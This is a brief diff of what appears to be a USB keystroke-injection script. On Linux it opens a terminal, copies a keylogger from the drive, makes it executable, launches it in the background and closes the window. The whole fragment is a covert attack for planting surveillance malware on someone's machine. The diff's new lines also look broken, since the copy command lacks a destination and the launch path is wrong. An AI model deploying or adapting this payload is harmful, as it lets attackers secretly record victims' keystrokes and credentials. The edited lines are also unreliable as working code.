@@ -222,11 +222,11 @@ DETECT_OS()
 IF ($_OS == LINUX) THEN
     CTRL ALT t
     DELAY 2000
-    STRINGLN cp /media/k3p4/HEHE/keylogger /tmp && cd /tmp
+    STRINGLN cp /media/k3p4/HEHE/keylogger
     DELAY 500
-    STRINGLN chmod +x keylogger
+    STRINGLN chmod +x /tmp/keylogger
     DELAY 500
-    STRINGLN ./keylogger&
+    STRINGLN ./tmp/keylogger&
     DELAY 2000
     CTRL w
     DELAY 1000
